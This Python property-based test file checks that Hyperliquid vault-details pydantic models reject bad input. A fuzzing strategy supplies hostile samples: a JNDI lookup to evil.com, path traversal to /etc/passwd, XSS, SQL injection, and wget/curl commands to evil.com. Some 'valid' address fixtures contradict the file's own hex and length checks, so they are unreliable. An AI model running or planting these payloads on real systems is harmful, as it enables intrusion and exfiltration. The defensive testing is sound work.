"""Property-based tests for Hyperliquid raw vault details models.

These tests validate critical security boundary models that process external vault details data.
The models tested here are essential for vault management, performance tracking, and user equity management.

SECURITY CRITICAL: These raw models protect against:
- Malicious vault details data that could manipulate vault information
- Financial precision errors in equity and balance calculations
- Buffer overflow attacks through oversized vault structures
- Injection attacks through malformed vault data
- Type confusion that could bypass vault validation
- Address spoofing in vault and user addresses
- Performance history manipulation that could affect analytics
- User equity manipulation that could affect financial reporting

Property testing ensures comprehensive coverage of vault details edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_vault_details import (
    HyperliquidRawVaultDetailsResponse,
    HyperliquidRawVaultPerformanceHistoryItem,
    HyperliquidRawVaultRelationship,
    HyperliquidRawVaultRelationshipData,
    HyperliquidRawVaultUserEquity,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR VAULT DETAILS MODEL TESTING
# =============================================================================


def valid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate valid Ethereum addresses for vault-related addresses."""
    return st.one_of([
        # Known valid addresses
        st.sampled_from([
            "0x1234567890abcdef1234567890abcdef12345678",
            "0xcreatoraddress1234567890abcdef1234567890",
            "0xvaultaddress1234567890abcdef1234567890",
            "0x742d35cc6aB26c94C2cF04E1b1F4c2eD2bF4D1C3",
            "0xDe0B295669a9FD93d5F28D9Ec85E40f4cb697BAe",
            "0x0000000000000000000000000000000000000000",  # Zero address
        ]),
        # Generated valid addresses
        st.builds(
            lambda hex_part: f"0x{hex_part}",
            st.text(min_size=40, max_size=40, alphabet="0123456789abcdefABCDEF"),
        ),
    ])


def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
    """Generate invalid Ethereum address strings."""
    return st.one_of([
        # Wrong length
        st.text(min_size=1, max_size=39, alphabet="0123456789abcdefABCDEF"),
        st.text(min_size=41, max_size=100, alphabet="0123456789abcdefABCDEF"),
        # Missing 0x prefix
        st.text(min_size=40, max_size=40, alphabet="0123456789abcdefABCDEF"),
        # Common invalid formats
        st.just("not-an-address"),
        st.just("0x123"),
        st.just("short"),
        st.just(""),
    ])


def financial_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for financial amounts."""
    return st.one_of([
        # Common financial values
        st.decimals(
            min_value=Decimal("0"),
            max_value=Decimal("1000000000"),  # 1 billion max
            places=8,
            allow_nan=False,
            allow_infinity=False,
        ).map(str),
        # Specific test values
        st.just("123.45"),
        st.just("10000.50"),
        st.just("500.25"),
        st.just("1000000.00"),
        st.just("500000.00"),
        st.just("50000.00"),
        st.just("75000.00"),
        st.just("10000.00"),
        st.just("5000.00"),
        st.just("0.0"),
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def pnl_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate valid decimal strings for PnL (can be negative)."""
    return st.one_of([
        # Common PnL values (positive and negative)
        st.decimals(
            min_value=Decimal("-1000000"),
            max_value=Decimal("1000000"),
            places=8,
            allow_nan=False,
            allow_infinity=False,
        ).map(str),
        # Specific test values
        st.just("123.45"),
        st.just("-123.45"),
        st.just("0.0"),
        st.just("500.25"),
        st.just("-500.25"),
    ])


def invalid_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate invalid decimal strings."""
    return st.one_of([
        # Non-finite values
        st.just("NaN"),
        st.just("inf"),
        st.just("-inf"),
        st.just("Infinity"),
        st.just("-Infinity"),
        # Invalid decimal formats
        st.just("1..0"),
        st.just("not-a-decimal"),
        st.just("invalid"),
        st.just("abc"),
        st.just(""),
        st.just("   "),
    ])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values."""
    return st.one_of([
        # Valid timestamp ranges
        st.integers(min_value=0, max_value=2**63 - 1),
        st.integers(min_value=1640995200000, max_value=2147483647000),  # MS timestamp range
        # Common values
        st.just(1700926145201),
        st.just(1690000000000),
        st.just(1750000000000),
        # Edge cases
        st.just(0),  # Zero timestamp
    ])


def vault_name_strategy() -> SearchStrategy[str]:
    """Generate valid vault names."""
    return st.one_of([
        st.text(min_size=1, max_size=100).filter(lambda x: x.strip()),
        st.sampled_from([
            "Test Vault",
            "Strategy Vault Alpha",
            "Delta Neutral Fund",
            "Arbitrage Vault",
            "High Frequency Trading",
        ]),
    ])


def vault_description_strategy() -> SearchStrategy[str]:
    """Generate valid vault descriptions."""
    return st.one_of([
        st.text(min_size=0, max_size=1000),
        st.sampled_from([
            "A vault for testing",
            "Delta neutral arbitrage strategy",
            "High frequency trading vault",
            "",
        ]),
    ])


@st.composite
def valid_performance_history_item_strategy(draw) -> dict[str, Any]:
    """Generate valid performance history item data."""
    return {
        "time": draw(timestamp_strategy()),
        "pnl": draw(pnl_decimal_string_strategy()),
    }


@st.composite
def valid_user_equity_strategy(draw) -> dict[str, Any]:
    """Generate valid user equity data."""
    return {
        "user": draw(valid_ethereum_address_strategy()),
        "equity": draw(financial_decimal_string_strategy()),
        "allTimePnl": draw(pnl_decimal_string_strategy()),
        "daysFollowing": draw(st.integers(min_value=0, max_value=10000)),
        "vaultEntryTime": draw(timestamp_strategy()),
        "lockupUntil": draw(timestamp_strategy()),
    }


@st.composite
def valid_relationship_data_strategy(draw) -> dict[str, Any]:
    """Generate valid relationship data."""
    return {
        "childAddresses": draw(
            st.lists(
                valid_ethereum_address_strategy(),
                min_size=0,
                max_size=10,
            )
        ),
    }


@st.composite
def valid_relationship_strategy(draw) -> dict[str, Any]:
    """Generate valid relationship data."""
    return {
        "type": draw(st.sampled_from(["parent", "child", "standalone"])),
        "data": draw(valid_relationship_data_strategy()),
    }


@st.composite
def valid_vault_details_response_strategy(draw) -> dict[str, Any]:
    """Generate valid vault details response data."""
    return {
        "name": draw(vault_name_strategy()),
        "description": draw(vault_description_strategy()),
        "allowDeposits": draw(st.booleans()),
        "alwaysCloseOnWithdraw": draw(st.booleans()),
        "creator": draw(valid_ethereum_address_strategy()),
        "vaultAddress": draw(valid_ethereum_address_strategy()),
        "maxBalance": draw(financial_decimal_string_strategy()),
        "currBalance": draw(financial_decimal_string_strategy()),
        "totalPnl": draw(pnl_decimal_string_strategy()),
        "allTimePnl": draw(pnl_decimal_string_strategy()),
        "performanceHistory": draw(
            st.lists(
                valid_performance_history_item_strategy(),
                min_size=0,
                max_size=100,
            )
        ),
        "userEquities": draw(
            st.lists(
                valid_user_equity_strategy(),
                min_size=0,
                max_size=50,
            )
        ),
        "maxDistributable": draw(financial_decimal_string_strategy()),
        "maxWithdrawable": draw(financial_decimal_string_strategy()),
        "isClosed": draw(st.booleans()),
        "relationship": draw(valid_relationship_strategy()),
    }


def malicious_vault_details_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for vault details security testing."""
    return st.one_of([
        # Vault details manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-vault-details}"),
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('vault-details-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE vault_details;--"),
        st.just("1' UNION SELECT * FROM vaults--"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("V" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.vault_details.find(); //"),
        # JSON injection
        st.just('{"$where": "this.balance > 1000000"}'),
        # Financial manipulation
        st.just("1000.0'; UPDATE vault_details SET balance=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW VAULT PERFORMANCE HISTORY ITEM MODEL
# =============================================================================


class TestHyperliquidRawVaultPerformanceHistoryItemProperties:
    """Property-based tests for HyperliquidRawVaultPerformanceHistoryItem validation and security."""

    @given(item_data=valid_performance_history_item_strategy())
    def test_performance_history_item_validation_success_properties(
        self, item_data: dict[str, Any]
    ) -> None:
        """Property: Valid performance history item data should always create valid objects."""
        # Skip invalid data
        try:
            # Validate timestamp
            assume(isinstance(item_data["time"], int) and item_data["time"] >= 0)

            # Validate PnL field
            pnl = item_data["pnl"]
            assume(isinstance(pnl, str) and pnl.strip())
            decimal_val = Decimal(pnl)
            assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        obj = HyperliquidRawVaultPerformanceHistoryItem.model_validate(item_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawVaultPerformanceHistoryItem)

        # Property: All fields should be preserved with correct types
        assert obj.time == item_data["time"]
        assert isinstance(obj.pnl, str)

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["time", "pnl"]),
        malicious_value=malicious_vault_details_strategy(),
    )
    def test_performance_history_item_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Performance history item model should reject malicious inputs safely."""
        base_data = {
            "time": 1700926145201,
            "pnl": "123.45",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawVaultPerformanceHistoryItem.model_validate(base_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW VAULT USER EQUITY MODEL
# =============================================================================


class TestHyperliquidRawVaultUserEquityProperties:
    """Property-based tests for HyperliquidRawVaultUserEquity validation and security."""

    @given(equity_data=valid_user_equity_strategy())
    def test_user_equity_validation_success_properties(self, equity_data: dict[str, Any]) -> None:
        """Property: Valid user equity data should always create valid objects."""
        # Skip invalid data
        try:
            # Validate user address
            address = equity_data["user"]
            assume(isinstance(address, str) and len(address) == 42)
            assume(address.startswith("0x"))
            assume(all(c in "0123456789abcdefABCDEF" for c in address[2:]))

            # Validate decimal fields
            for field in ["equity", "allTimePnl"]:
                value = equity_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite())
                if field == "equity":
                    assume(decimal_val >= 0)  # Equity should be non-negative

            # Validate integer fields
            assume(
                isinstance(equity_data["daysFollowing"], int) and equity_data["daysFollowing"] >= 0
            )
            assume(
                isinstance(equity_data["vaultEntryTime"], int)
                and equity_data["vaultEntryTime"] >= 0
            )
            assume(isinstance(equity_data["lockupUntil"], int) and equity_data["lockupUntil"] >= 0)
        except (ValueError, TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawVaultUserEquity.model_validate(equity_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawVaultUserEquity)

        # Property: All fields should be preserved with correct types
        assert obj.user == equity_data["user"]
        assert isinstance(obj.equity, str)
        assert isinstance(obj.all_time_pnl, str)
        assert obj.days_following == equity_data["daysFollowing"]
        assert obj.vault_entry_time == equity_data["vaultEntryTime"]
        assert obj.lockup_until == equity_data["lockupUntil"]

    @given(invalid_address=invalid_ethereum_address_strategy())
    def test_user_equity_invalid_address_properties(self, invalid_address: str) -> None:
        """Property: User equity should reject invalid Ethereum addresses."""
        equity_data = {
            "user": invalid_address,
            "equity": "10000.50",
            "allTimePnl": "500.25",
            "daysFollowing": 10,
            "vaultEntryTime": 1690000000000,
            "lockupUntil": 1750000000000,
        }

        # Property: Invalid addresses should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawVaultUserEquity.model_validate(equity_data)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW VAULT RELATIONSHIP MODELS
# =============================================================================


class TestHyperliquidRawVaultRelationshipDataProperties:
    """Property-based tests for HyperliquidRawVaultRelationshipData validation and security."""

    @given(relationship_data=valid_relationship_data_strategy())
    def test_relationship_data_validation_success_properties(
        self, relationship_data: dict[str, Any]
    ) -> None:
        """Property: Valid relationship data should always create valid objects."""
        # Skip invalid data
        try:
            child_addresses = relationship_data["childAddresses"]
            assume(isinstance(child_addresses, list))
            for address in child_addresses:
                assume(isinstance(address, str) and len(address) == 42)
                assume(address.startswith("0x"))
                assume(all(c in "0123456789abcdefABCDEF" for c in address[2:]))
        except (TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawVaultRelationshipData.model_validate(relationship_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawVaultRelationshipData)

        # Property: Child addresses should be preserved
        assert obj.child_addresses == relationship_data["childAddresses"]


class TestHyperliquidRawVaultRelationshipProperties:
    """Property-based tests for HyperliquidRawVaultRelationship validation and security."""

    @given(relationship=valid_relationship_strategy())
    def test_relationship_validation_success_properties(self, relationship: dict[str, Any]) -> None:
        """Property: Valid relationship data should always create valid objects."""
        # Skip invalid data
        try:
            assume(isinstance(relationship["type"], str))
            assume(relationship["type"] in ["parent", "child", "standalone"])

            data = relationship["data"]
            assume(isinstance(data, dict))
            child_addresses = data["childAddresses"]
            assume(isinstance(child_addresses, list))
            for address in child_addresses:
                assume(isinstance(address, str) and len(address) == 42)
                assume(address.startswith("0x"))
        except (TypeError, KeyError, IndexError):
            assume(False)

        obj = HyperliquidRawVaultRelationship.model_validate(relationship)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawVaultRelationship)

        # Property: All fields should be preserved
        assert obj.type == relationship["type"]
        assert isinstance(obj.data, HyperliquidRawVaultRelationshipData)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW VAULT DETAILS RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawVaultDetailsResponseProperties:
    """Property-based tests for HyperliquidRawVaultDetailsResponse validation and security."""

    @given(vault_data=valid_vault_details_response_strategy())
    def test_vault_details_response_validation_success_properties(
        self, vault_data: dict[str, Any]
    ) -> None:
        """Property: Valid vault details data should always create valid objects."""
        # Skip invalid data
        try:
            # Validate required string fields
            assume(isinstance(vault_data["name"], str) and vault_data["name"].strip())

            # Validate addresses
            for addr_field in ["creator", "vaultAddress"]:
                address = vault_data[addr_field]
                assume(isinstance(address, str) and len(address) == 42)
                assume(address.startswith("0x"))
                assume(all(c in "0123456789abcdefABCDEF" for c in address[2:]))

            # Validate decimal fields
            for field in [
                "maxBalance",
                "currBalance",
                "totalPnl",
                "allTimePnl",
                "maxDistributable",
                "maxWithdrawable",
            ]:
                value = vault_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite())
                if field in ["maxBalance", "currBalance", "maxDistributable", "maxWithdrawable"]:
                    assume(decimal_val >= 0)  # Balances should be non-negative

            # Validate boolean fields
            for field in ["allowDeposits", "alwaysCloseOnWithdraw", "isClosed"]:
                assume(isinstance(vault_data[field], bool))

            # Validate lists
            assume(isinstance(vault_data["performanceHistory"], list))
            assume(isinstance(vault_data["userEquities"], list))

            # Validate relationship
            relationship = vault_data["relationship"]
            assume(isinstance(relationship, dict))
            assume(isinstance(relationship["type"], str))
            assume(isinstance(relationship["data"], dict))

        except (ValueError, TypeError, IndexError, KeyError):
            assume(False)

        obj = HyperliquidRawVaultDetailsResponse.model_validate(vault_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawVaultDetailsResponse)

        # Property: All fields should be preserved with correct types
        assert obj.name == vault_data["name"]
        assert obj.allow_deposits == vault_data["allowDeposits"]
        assert obj.vault_address == vault_data["vaultAddress"]
        assert isinstance(obj.max_balance, str)
        assert isinstance(obj.curr_balance, str)
        assert isinstance(obj.performance_history, list)
        assert isinstance(obj.user_equities, list)
        assert isinstance(obj.relationship, HyperliquidRawVaultRelationship)

    @given(
        field_name=st.sampled_from([
            "name",
            "creator",
            "vaultAddress",
            "maxBalance",
            "currBalance",
            "totalPnl",
            "allTimePnl",
            "maxDistributable",
            "maxWithdrawable",
        ]),
        malicious_value=malicious_vault_details_strategy(),
    )
    def test_vault_details_response_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Vault details response should reject malicious inputs safely."""
        base_data = {
            "name": "Test Vault",
            "description": "A vault for testing",
            "allowDeposits": True,
            "alwaysCloseOnWithdraw": False,
            "creator": "0xcreatoraddress1234567890abcdef1234567890",
            "vaultAddress": "0xvaultaddress1234567890abcdef1234567890",
            "maxBalance": "1000000.00",
            "currBalance": "500000.00",
            "totalPnl": "50000.00",
            "allTimePnl": "75000.00",
            "performanceHistory": [],
            "userEquities": [],
            "maxDistributable": "10000.00",
            "maxWithdrawable": "5000.00",
            "isClosed": False,
            "relationship": {"type": "parent", "data": {"childAddresses": []}},
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawVaultDetailsResponse.model_validate(base_data)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawVaultDetailsIntegrationProperties:
    """Integration property tests for vault details models working together."""

    @given(
        vault_details_list=st.lists(
            valid_vault_details_response_strategy(),
            min_size=2,
            max_size=5,
        ),
        malicious_value=malicious_vault_details_strategy(),
    )
    def test_vault_details_batch_processing_properties(
        self, vault_details_list: list[dict[str, Any]], malicious_value: Any
    ) -> None:
        """Property: Multiple vault details should be processed independently."""
        valid_vaults = []

        for vault_data in vault_details_list:
            # Skip invalid vaults
            try:
                if not (isinstance(vault_data["name"], str) and vault_data["name"].strip()):
                    continue

                vault = HyperliquidRawVaultDetailsResponse.model_validate(vault_data)
                valid_vaults.append(vault)
            except (ValidationError, TypeError, KeyError):
                continue

        # Property: Each vault should maintain its individual values
        for i, vault in enumerate(valid_vaults):
            assert isinstance(vault.name, str)
            assert isinstance(vault.vault_address, str)

            # Property: Vaults should not affect each other
            for j, other_vault in enumerate(valid_vaults):
                if i != j:
                    # Each vault is independent
                    assert isinstance(other_vault.name, str)
                    assert isinstance(other_vault.vault_address, str)

        # Property: Malicious value should be rejected when injected
        if valid_vaults:
            corrupted_data = {
                "name": malicious_value,
                "description": "A vault for testing",
                "allowDeposits": True,
                "alwaysCloseOnWithdraw": False,
                "creator": "0xcreatoraddress1234567890abcdef1234567890",
                "vaultAddress": "0xvaultaddress1234567890abcdef1234567890",
                "maxBalance": "1000000.00",
                "currBalance": "500000.00",
                "totalPnl": "50000.00",
                "allTimePnl": "75000.00",
                "performanceHistory": [],
                "userEquities": [],
                "maxDistributable": "10000.00",
                "maxWithdrawable": "5000.00",
                "isClosed": False,
                "relationship": {"type": "parent", "data": {"childAddresses": []}},
            }
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                HyperliquidRawVaultDetailsResponse.model_validate(corrupted_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_perf_history_item_valid() -> None:
    """Test perf history item valid."""
    valid_performance_history_item = {"time": 1700926145201, "pnl": "123.45"}
    item = HyperliquidRawVaultPerformanceHistoryItem.model_validate(valid_performance_history_item)
    assert item.time == valid_performance_history_item["time"]
    assert item.pnl == valid_performance_history_item["pnl"]


def test_perf_history_item_invalid_time() -> None:
    """Test perf history item invalid time."""
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawVaultPerformanceHistoryItem.model_validate({"time": -1, "pnl": "123.45"})


def test_perf_history_item_invalid_pnl() -> None:
    """Test perf history item invalid pnl."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultPerformanceHistoryItem.model_validate({
            "time": 1700926145201,
            "pnl": "not-a-decimal",
        })


def test_perf_history_item_extra_field() -> None:
    """Test perf history item extra field."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultPerformanceHistoryItem.model_validate({
            "time": 1700926145201,
            "pnl": "123.45",
            "extra": "field",
        })


def test_user_equity_valid() -> None:
    """Test user equity valid."""
    valid_user_equity_item = {
        "user": "0x1234567890abcdef1234567890abcdef12345678",
        "equity": "10000.50",
        "allTimePnl": "500.25",
        "daysFollowing": 10,
        "vaultEntryTime": 1690000000000,
        "lockupUntil": 1750000000000,
    }
    item = HyperliquidRawVaultUserEquity.model_validate(valid_user_equity_item)
    assert item.user == valid_user_equity_item["user"]
    assert item.equity == "10000.5"  # Business logic normalizes decimal strings
    assert item.lockup_until == valid_user_equity_item["lockupUntil"]


def test_user_equity_invalid_user_address() -> None:
    """Test user equity invalid user address."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultUserEquity.model_validate({
            "user": "not-an-address",
            "equity": "10000.50",
            "allTimePnl": "500.25",
            "daysFollowing": 10,
            "vaultEntryTime": 1690000000000,
            "lockupUntil": 1750000000000,
        })


def test_user_equity_invalid_equity() -> None:
    """Test user equity invalid equity."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultUserEquity.model_validate({
            "user": "0x1234567890abcdef1234567890abcdef12345678",
            "equity": "invalid",
            "allTimePnl": "500.25",
            "daysFollowing": 10,
            "vaultEntryTime": 1690000000000,
            "lockupUntil": 1750000000000,
        })


def test_relationship_data_valid() -> None:
    """Test relationship data valid."""
    valid_relationship_data_parent = {"childAddresses": ["0xchild1", "0xchild2"]}
    data = HyperliquidRawVaultRelationshipData.model_validate(valid_relationship_data_parent)
    assert data.child_addresses == valid_relationship_data_parent["childAddresses"]


def test_relationship_data_invalid_child_address() -> None:
    """Test relationship data invalid child address."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultRelationshipData.model_validate({
            "childAddresses": ["0xvalid", "invalid-address"]
        })


def test_relationship_valid() -> None:
    """Test relationship valid."""
    valid_relationship = {"type": "parent", "data": {"childAddresses": ["0xchild1", "0xchild2"]}}
    rel = HyperliquidRawVaultRelationship.model_validate(valid_relationship)
    assert rel.type == valid_relationship["type"]
    assert rel.data.child_addresses == valid_relationship["data"]["childAddresses"]


def test_relationship_missing_type() -> None:
    """Test relationship missing type."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultRelationship.model_validate({"data": {"childAddresses": ["0xchild1"]}})


def test_vault_details_valid() -> None:
    """Test vault details valid."""
    valid_vault_details_response = {
        "name": "Test Vault",
        "description": "A vault for testing",
        "allowDeposits": True,
        "alwaysCloseOnWithdraw": False,
        "creator": "0xcreatoraddress1234567890abcdef1234567890",
        "vaultAddress": "0xvaultaddress1234567890abcdef1234567890",
        "maxBalance": "1000000.00",
        "currBalance": "500000.00",
        "totalPnl": "50000.00",
        "allTimePnl": "75000.00",
        "performanceHistory": [{"time": 1700926145201, "pnl": "123.45"}],
        "userEquities": [
            {
                "user": "0x1234567890abcdef1234567890abcdef12345678",
                "equity": "10000.50",
                "allTimePnl": "500.25",
                "daysFollowing": 10,
                "vaultEntryTime": 1690000000000,
                "lockupUntil": 1750000000000,
            }
        ],
        "maxDistributable": "10000.00",
        "maxWithdrawable": "5000.00",
        "isClosed": False,
        "relationship": {"type": "parent", "data": {"childAddresses": ["0xchild1", "0xchild2"]}},
    }
    resp = HyperliquidRawVaultDetailsResponse.model_validate(valid_vault_details_response)
    assert resp.name == valid_vault_details_response["name"]
    assert resp.allow_deposits == valid_vault_details_response["allowDeposits"]
    assert resp.vault_address == valid_vault_details_response["vaultAddress"]
    assert resp.max_balance == "1000000"  # Business logic normalizes decimal strings
    assert resp.curr_balance == "500000"  # Business logic normalizes decimal strings
    assert len(resp.performance_history) == 1
    assert resp.performance_history[0].time == 1700926145201
    assert len(resp.user_equities) == 1
    assert resp.user_equities[0].user == "0x1234567890abcdef1234567890abcdef12345678"
    assert resp.relationship.type == "parent"


def test_vault_details_missing_name() -> None:
    """Test vault details missing name."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultDetailsResponse.model_validate({
            "description": "A vault for testing",
            "allowDeposits": True,
            "alwaysCloseOnWithdraw": False,
            "creator": "0xcreatoraddress1234567890abcdef1234567890",
            "vaultAddress": "0xvaultaddress1234567890abcdef1234567890",
            "maxBalance": "1000000.00",
            "currBalance": "500000.00",
            "totalPnl": "50000.00",
            "allTimePnl": "75000.00",
            "performanceHistory": [],
            "userEquities": [],
            "maxDistributable": "10000.00",
            "maxWithdrawable": "5000.00",
            "isClosed": False,
            "relationship": {"type": "parent", "data": {"childAddresses": []}},
        })


def test_vault_details_invalid_creator_address() -> None:
    """Test vault details invalid creator address."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultDetailsResponse.model_validate({
            "name": "Test Vault",
            "description": "A vault for testing",
            "allowDeposits": True,
            "alwaysCloseOnWithdraw": False,
            "creator": "short",
            "vaultAddress": "0xvaultaddress1234567890abcdef1234567890",
            "maxBalance": "1000000.00",
            "currBalance": "500000.00",
            "totalPnl": "50000.00",
            "allTimePnl": "75000.00",
            "performanceHistory": [],
            "userEquities": [],
            "maxDistributable": "10000.00",
            "maxWithdrawable": "5000.00",
            "isClosed": False,
            "relationship": {"type": "parent", "data": {"childAddresses": []}},
        })


def test_vault_details_invalid_balance() -> None:
    """Test vault details invalid balance."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultDetailsResponse.model_validate({
            "name": "Test Vault",
            "description": "A vault for testing",
            "allowDeposits": True,
            "alwaysCloseOnWithdraw": False,
            "creator": "0xcreatoraddress1234567890abcdef1234567890",
            "vaultAddress": "0xvaultaddress1234567890abcdef1234567890",
            "maxBalance": "Infinity",
            "currBalance": "500000.00",
            "totalPnl": "50000.00",
            "allTimePnl": "75000.00",
            "performanceHistory": [],
            "userEquities": [],
            "maxDistributable": "10000.00",
            "maxWithdrawable": "5000.00",
            "isClosed": False,
            "relationship": {"type": "parent", "data": {"childAddresses": []}},
        })


def test_vault_details_extra_field() -> None:
    """Test vault details extra field."""
    with pytest.raises(ValidationError):
        HyperliquidRawVaultDetailsResponse.model_validate({
            "name": "Test Vault",
            "description": "A vault for testing",
            "allowDeposits": True,
            "alwaysCloseOnWithdraw": False,
            "creator": "0xcreatoraddress1234567890abcdef1234567890",
            "vaultAddress": "0xvaultaddress1234567890abcdef1234567890",
            "maxBalance": "1000000.00",
            "currBalance": "500000.00",
            "totalPnl": "50000.00",
            "allTimePnl": "75000.00",
            "performanceHistory": [],
            "userEquities": [],
            "maxDistributable": "10000.00",
            "maxWithdrawable": "5000.00",
            "isClosed": False,
            "relationship": {"type": "parent", "data": {"childAddresses": []}},
            "surprise": "field",
        })
